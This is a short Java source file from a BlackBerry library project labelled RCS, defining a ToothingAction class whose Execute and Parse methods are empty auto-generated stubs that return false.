/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : ToothingAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.action;

public class ToothingAction extends SubAction {
    public ToothingAction(int actionId, byte[] confParams) {
        super(actionId);
        Parse(confParams);
    }

    public boolean Execute() {
        // TODO Auto-generated method stub
        return false;
    }

    protected boolean Parse(byte[] confParams) {
        // TODO Auto-generated method stub
        return false;
    }

}
